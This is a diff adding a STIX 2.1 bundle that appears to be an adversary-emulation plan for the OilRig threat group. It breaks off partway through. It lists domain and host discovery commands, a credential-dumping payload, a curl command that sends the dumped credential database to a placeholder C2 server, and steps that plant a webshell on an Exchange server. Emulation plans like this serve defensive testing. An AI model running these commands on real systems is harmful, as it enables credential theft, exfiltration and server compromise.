@@ -1,0 +1,1764 @@
+{
+    "type": "bundle",
+    "id": "bundle--0ec992a1-3a90-4a33-8855-999b6221373c",
+    "objects": [
+        {
+            "type": "campaign",
+            "spec_version": "2.1",
+            "id": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "created": "2024-02-04T21:17:50.913166Z",
+            "modified": "2024-02-04T21:17:50.913166Z",
+            "name": "OilRig",
+            "description": "OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims."
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ed2471a9-1eeb-4787-a5d8-61f66b278a50",
+            "created": "2024-02-04T21:17:50.913616Z",
+            "modified": "2024-02-04T21:17:50.913616Z",
+            "name": "OilRig Execute VBS payload to collect hostname",
+            "description": "Executes the payload to collect the hostname of the victim machine. \n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "cscript /nologo computername.vbs\n",
+                                "payloads": [
+                                    "computername.vbs"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--79faec31-8f53-4869-becb-52ae1aecbed1",
+            "created": "2024-02-04T21:17:50.913961Z",
+            "modified": "2024-02-04T21:17:50.913961Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--ed2471a9-1eeb-4787-a5d8-61f66b278a50"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--88378065-bedf-46b9-a8b7-bc5897f4abcb",
+            "created": "2024-02-04T21:17:50.914326Z",
+            "modified": "2024-02-04T21:17:50.914326Z",
+            "name": "OilRig Execute VBS payload to collect username",
+            "description": "Executes the payload to collect the username of the victim machine. \n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1033",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "cscript /nologo username.vbs\n",
+                                "payloads": [
+                                    "username.vbs"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "System Owner/User Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5b06cdb8-7e9f-458d-aab0-e1f7206fbf69",
+            "created": "2024-02-04T21:17:50.914647Z",
+            "modified": "2024-02-04T21:17:50.914647Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--88378065-bedf-46b9-a8b7-bc5897f4abcb"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--0386ef16-757e-425c-8355-88e5be40eb32",
+            "created": "2024-02-04T21:17:50.914993Z",
+            "modified": "2024-02-04T21:17:50.914993Z",
+            "name": "OilRig Current User",
+            "description": "Obtain user from current session",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1033",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "whoami"
+                            }
+                        }
+                    },
+                    "technique_name": "System Owner/User Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--29530f1d-7899-41fc-a257-193579b0cdba",
+            "created": "2024-02-04T21:17:50.915319Z",
+            "modified": "2024-02-04T21:17:50.915319Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--0386ef16-757e-425c-8355-88e5be40eb32"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--a9861ea9-4f9a-46c9-ba60-15a02806dfdc",
+            "created": "2024-02-04T21:17:50.915683Z",
+            "modified": "2024-02-04T21:17:50.915683Z",
+            "name": "OilRig Collect hostname",
+            "description": "Find the hostname",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "hostname"
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--59b6df37-8c76-404a-b8b0-94954c68f994",
+            "created": "2024-02-04T21:17:50.915994Z",
+            "modified": "2024-02-04T21:17:50.915994Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--a9861ea9-4f9a-46c9-ba60-15a02806dfdc"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--628e8ad3-14af-4670-b797-bcf175a42842",
+            "created": "2024-02-04T21:17:50.916345Z",
+            "modified": "2024-02-04T21:17:50.916345Z",
+            "name": "OilRig Network Interface Configuration",
+            "description": "View network configuration information for host",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1016",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "ipconfig /all"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Configuration Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a3dde001-2db4-48d1-beb9-8ebe846d5ec6",
+            "created": "2024-02-04T21:17:50.917991Z",
+            "modified": "2024-02-04T21:17:50.917991Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--628e8ad3-14af-4670-b797-bcf175a42842"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--13d5ab62-c05a-4d25-bd8f-e3b27a5be611",
+            "created": "2024-02-04T21:17:50.918398Z",
+            "modified": "2024-02-04T21:17:50.918398Z",
+            "name": "OilRig Domain Account Discovery",
+            "description": "The net utility is executed via cmd to enumerate domain user accounts.",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1087.002",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net user /domain"
+                            }
+                        }
+                    },
+                    "technique_name": "Account Discovery: Domain Account"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--76ed851f-3eb6-4c00-b7da-8c267b0c9599",
+            "created": "2024-02-04T21:17:50.918736Z",
+            "modified": "2024-02-04T21:17:50.918736Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--13d5ab62-c05a-4d25-bd8f-e3b27a5be611"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--e0b534a6-bff3-4964-8f7b-863ddee224b0",
+            "created": "2024-02-04T21:17:50.919087Z",
+            "modified": "2024-02-04T21:17:50.919087Z",
+            "name": "OilRig Group Account Discovery",
+            "description": "The net utility is executed via cmd to enumerate group accounts.",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1069.002",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net group /domain"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery: Domain Groups"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1cf6cd25-8b68-4c90-a2dd-bcd7ecd3f901",
+            "created": "2024-02-04T21:17:50.91935Z",
+            "modified": "2024-02-04T21:17:50.91935Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--e0b534a6-bff3-4964-8f7b-863ddee224b0"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--3d450711-1062-4276-8bff-bb78ec4f4519",
+            "created": "2024-02-04T21:17:50.919588Z",
+            "modified": "2024-02-04T21:17:50.919588Z",
+            "name": "OilRig \"domain admins\" Group Discovery",
+            "description": "The net utility is executed via cmd to enumerate the \"domain admins\" group",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1069.002",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net group \"domain admins\" /domain"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery: Domain Groups"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a1e65d06-4794-4e86-90b7-6c6c3b2e453c",
+            "created": "2024-02-04T21:17:50.919799Z",
+            "modified": "2024-02-04T21:17:50.919799Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--3d450711-1062-4276-8bff-bb78ec4f4519"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--29c018ed-eb3e-4ddb-90ec-ba3d928a00e8",
+            "created": "2024-02-04T21:17:50.920025Z",
+            "modified": "2024-02-04T21:17:50.920025Z",
+            "name": "OilRig \"Exchange Trusted Subsystem\" Group Discovery",
+            "description": "The net utility is executed via cmd to enumerate the \"Exchange Trusted Subsystem\" group",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1069.002",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net group \"Exchange Trusted Subsystem\" /domain"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery: Domain Groups"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0fd9b940-2eec-413d-9462-562b206fd55b",
+            "created": "2024-02-04T21:17:50.920231Z",
+            "modified": "2024-02-04T21:17:50.920231Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--29c018ed-eb3e-4ddb-90ec-ba3d928a00e8"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--41ce9dd8-dc9f-4fba-8ce9-9ef5aaee3d19",
+            "created": "2024-02-04T21:17:50.920458Z",
+            "modified": "2024-02-04T21:17:50.920458Z",
+            "name": "OilRig List domain account settings",
+            "description": "View domain account settings and password policy",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1021",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net accounts /domain"
+                            }
+                        }
+                    },
+                    "technique_name": "Password Policy Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e17274bc-bc4a-4442-b7a9-b8a30d2a9e0c",
+            "created": "2024-02-04T21:17:50.92066Z",
+            "modified": "2024-02-04T21:17:50.92066Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--41ce9dd8-dc9f-4fba-8ce9-9ef5aaee3d19"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--821fd81e-2086-4ea6-b792-fb9e044e2323",
+            "created": "2024-02-04T21:17:50.920902Z",
+            "modified": "2024-02-04T21:17:50.920902Z",
+            "name": "OilRig Local Account Discovery",
+            "description": "Enumerate user accounts",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1087.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net user"
+                            }
+                        }
+                    },
+                    "technique_name": "Account Discovery: Local Account"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ff4fc721-3105-4a1c-8972-2039271efa71",
+            "created": "2024-02-04T21:17:50.921114Z",
+            "modified": "2024-02-04T21:17:50.921114Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--821fd81e-2086-4ea6-b792-fb9e044e2323"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ae4e4c08-82cb-4a17-a873-660f851a1a38",
+            "created": "2024-02-04T21:17:50.921544Z",
+            "modified": "2024-02-04T21:17:50.921544Z",
+            "name": "OilRig \"administrators\" local group discovery",
+            "description": "View the details and members of the \"administrators\" local group",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1069.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net localgroup administrators"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery: Local Groups"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--81551a2e-751c-4cdd-bab7-c4b774b5bcf9",
+            "created": "2024-02-04T21:17:50.921817Z",
+            "modified": "2024-02-04T21:17:50.921817Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--ae4e4c08-82cb-4a17-a873-660f851a1a38"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--cb8e9faa-ac00-48d8-a359-88044a2c0252",
+            "created": "2024-02-04T21:17:50.922361Z",
+            "modified": "2024-02-04T21:17:50.922361Z",
+            "name": "OilRig View Network Connections",
+            "description": "Find system network connections",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1049",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "netstat -na"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Connections Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cc07bc94-5be5-4cd3-896e-240d9dd464cc",
+            "created": "2024-02-04T21:17:50.922736Z",
+            "modified": "2024-02-04T21:17:50.922736Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--cb8e9faa-ac00-48d8-a359-88044a2c0252"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--de39f574-f6cc-4026-973e-c5370b36220b",
+            "created": "2024-02-04T21:17:50.923155Z",
+            "modified": "2024-02-04T21:17:50.923155Z",
+            "name": "OilRig Process discovery",
+            "description": "View running processes on system",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1057",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "tasklist"
+                            }
+                        }
+                    },
+                    "technique_name": "Process Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--79877248-5af1-4316-a44d-d2d701a5b048",
+            "created": "2024-02-04T21:17:50.923465Z",
+            "modified": "2024-02-04T21:17:50.923465Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--de39f574-f6cc-4026-973e-c5370b36220b"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--e6eb7d18-606e-4889-8924-f75cafa92811",
+            "created": "2024-02-04T21:17:50.923782Z",
+            "modified": "2024-02-04T21:17:50.923782Z",
+            "name": "OilRig System Service Discovery",
+            "description": "Gather information about registered local system services",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1007",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "sc query"
+                            }
+                        }
+                    },
+                    "technique_name": "System Service Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--332f835b-cac0-4535-8e22-540afdeb642d",
+            "created": "2024-02-04T21:17:50.924078Z",
+            "modified": "2024-02-04T21:17:50.924078Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--e6eb7d18-606e-4889-8924-f75cafa92811"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--178bb431-4eaf-43b1-922c-f484ab54bbee",
+            "created": "2024-02-04T21:17:50.924394Z",
+            "modified": "2024-02-04T21:17:50.924394Z",
+            "name": "OilRig System Information Discovery",
+            "description": "Gather detailed system information",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "systeminfo"
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b48322f8-e933-4186-bc2e-219e0c153171",
+            "created": "2024-02-04T21:17:50.924712Z",
+            "modified": "2024-02-04T21:17:50.924712Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--178bb431-4eaf-43b1-922c-f484ab54bbee"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--09502b3c-7541-4c11-92a9-f55e683a6355",
+            "created": "2024-02-04T21:17:50.925038Z",
+            "modified": "2024-02-04T21:17:50.925038Z",
+            "name": "OilRig Query Registry",
+            "description": "Query the Windows registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1012",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\""
+                            }
+                        }
+                    },
+                    "technique_name": "Query Registry"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--24f1e79c-ba42-4ebe-8b1f-5b94607f5dbf",
+            "created": "2024-02-04T21:17:50.925322Z",
+            "modified": "2024-02-04T21:17:50.925322Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--09502b3c-7541-4c11-92a9-f55e683a6355"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--7971246d-1392-411e-a803-a7946cf9e4d2",
+            "created": "2024-02-04T21:17:50.925644Z",
+            "modified": "2024-02-04T21:17:50.925644Z",
+            "name": "OilRig Targeted \"Gosta\" Account Discovery",
+            "description": "The net utility is executed via cmd to enumerate detailed information about the Gosta user account",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1087.002",
+                    "input_arguments": {
+                        "initial.target.user": {
+                            "default": "gosta",
+                            "description": "The username of the target host for initial access.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net user #{initial.target.user} /domain\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Account Discovery: Domain Account"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f5c3bbdc-e128-4698-af36-78c13e22769f",
+            "created": "2024-02-04T21:17:50.926943Z",
+            "modified": "2024-02-04T21:17:50.926943Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--7971246d-1392-411e-a803-a7946cf9e4d2",
+            "target_ref": "user-account--09f7ee28-c9ca-500d-a71d-172c9e7d3592"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--09f7ee28-c9ca-500d-a71d-172c9e7d3592",
+            "account_login": "gosta"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1608090f-2fc6-4f30-bc7b-510692a1fe12",
+            "created": "2024-02-04T21:17:50.927259Z",
+            "modified": "2024-02-04T21:17:50.927259Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--7971246d-1392-411e-a803-a7946cf9e4d2"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--6a7b4ba0-a9bb-451d-ba9f-d3a2e8a82ffe",
+            "created": "2024-02-04T21:17:50.927485Z",
+            "modified": "2024-02-04T21:17:50.927485Z",
+            "name": "OilRig \"SQL Admins\" Group Discovery",
+            "description": "The net utility is executed via cmd to enumerate the \"SQL Admins\" group",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1069.002",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net group \"SQL Admins\" /domain"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery: Domain Groups"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--02fb1351-6191-48f6-a776-580617d78314",
+            "created": "2024-02-04T21:17:50.927747Z",
+            "modified": "2024-02-04T21:17:50.927747Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--6a7b4ba0-a9bb-451d-ba9f-d3a2e8a82ffe"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f9f1bd68-ec0a-47e7-8645-210844190d92",
+            "created": "2024-02-04T21:17:50.92807Z",
+            "modified": "2024-02-04T21:17:50.92807Z",
+            "name": "OilRig nslookup WATERFALLS",
+            "description": "Perform DNS lookup for WATERFALLS",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1018",
+                    "input_arguments": {
+                        "second.target.host": {
+                            "default": "WATERFALLS",
+                            "description": "The hostname address of the second target host.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "nslookup #{second.target.host}\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote System Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f18d07d7-4657-44f5-a2c7-52da4cdac934",
+            "created": "2024-02-04T21:17:50.929065Z",
+            "modified": "2024-02-04T21:17:50.929065Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--f9f1bd68-ec0a-47e7-8645-210844190d92",
+            "target_ref": "user-account--a0386f60-07c2-5823-84ba-e773921b50f7"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--a0386f60-07c2-5823-84ba-e773921b50f7",
+            "account_login": "WATERFALLS"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d34cefc0-94b3-41fe-925f-1d7f4ee27db8",
+            "created": "2024-02-04T21:17:50.929423Z",
+            "modified": "2024-02-04T21:17:50.929423Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--f9f1bd68-ec0a-47e7-8645-210844190d92"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--a23fb84f-dfb7-4d07-a6ec-0352ae983651",
+            "created": "2024-02-04T21:17:50.929734Z",
+            "modified": "2024-02-04T21:17:50.929734Z",
+            "name": "OilRig Dump Credentials from Windows Credential Manager",
+            "description": "Create a SQLite database with output of Windows Credential Value for Internet Explorer\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1555.004",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "C:\\Users\\#{initial.target.user}\\AppData\\local\\SystemFailureReporter\\b.exe\n",
+                                "payloads": [
+                                    "b.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Credentials from Password Stores: Windows Credential Manager"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--de3fec7a-d7e1-4d12-9a8c-e611df628974",
+            "created": "2024-02-04T21:17:50.930076Z",
+            "modified": "2024-02-04T21:17:50.930076Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--a23fb84f-dfb7-4d07-a6ec-0352ae983651"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--021245dd-c0be-4900-bd6c-1c680f00a237",
+            "created": "2024-02-04T21:17:50.930397Z",
+            "modified": "2024-02-04T21:17:50.930397Z",
+            "name": "OilRig Exfil fsociety.dat",
+            "description": "Exfil the SQLite database fsociety.dat created by b.exe",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1041",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "curl -F \"data=@C:\\Users\\#{initial.target.user}\\AppData\\Roaming\\fsociety.dat\" --header \"X-Request-ID: #{initial.target.user}-#{paw}\" #{server}/file/upload\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Exfiltration Over C2 Channel"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--63795f08-4a84-4f45-82b7-49d8bf40b0ff",
+            "created": "2024-02-04T21:17:50.930712Z",
+            "modified": "2024-02-04T21:17:50.930712Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--021245dd-c0be-4900-bd6c-1c680f00a237"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--2f3be960-5c00-4f03-a9c2-da09c31d38d9",
+            "created": "2024-02-04T21:17:50.931038Z",
+            "modified": "2024-02-04T21:17:50.931038Z",
+            "name": "OilRig Copy webshell to THEBLOCK",
+            "description": "SystemFailureReporter.exe downloads contact.aspx\n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "copy  C:\\Users\\#{initial.target.user}\\AppData\\Local\\SystemFailureReporter\\contact.aspx C:\\Users\\Public\\contact.aspx\n",
+                                "payloads": [
+                                    "contact.aspx"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7861c4d6-6327-410d-9d3b-0d0e5a04216c",
+            "created": "2024-02-04T21:17:50.931345Z",
+            "modified": "2024-02-04T21:17:50.931345Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--db88ae87-8884-42f1-aa06-d7ef9b45721d",
+            "target_ref": "attack-pattern--2f3be960-5c00-4f03-a9c2-da09c31d38d9"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--7aaecfb7-a1eb-477c-8d53-ab3009389623",
+            "created": "2024-02-04T21:17:50.93168Z",
+            "modified": "2024-02-04T21:17:50.93168Z",
+            "name": "OilRig Copy webshell to WATERFALLS",
+            "description": "contact.aspx is copied from THEBLOCK to WATERFALL to the Exchange Web Services directory. This ability implements Step 4.A.3.  \n",
+            "extensions": {
+                "extension-definition--61b43580-1d7e-4ee9-83d5-8c655178f232": {
+                    "attack_id": "T1505.003",
+                    "input_arguments": {
+                        "second.target.ip": {
+                            "default": "10.1.0.6",
+                            "description": "The IPv4 address of the Exchange server.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "copy C:\\Users\\Public\\contact.aspx \"\\\\#{second.target.ip}\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\exchweb\\ews\\\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Server Software Component: Web Shell"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--9bf180b9-189e-4d7b-ab1a-abe418b98cfd",
+            "created": "2024-02-04T21:17:50.932721Z",
+            "modified": "2024-02-04T21:17:50.932721Z",
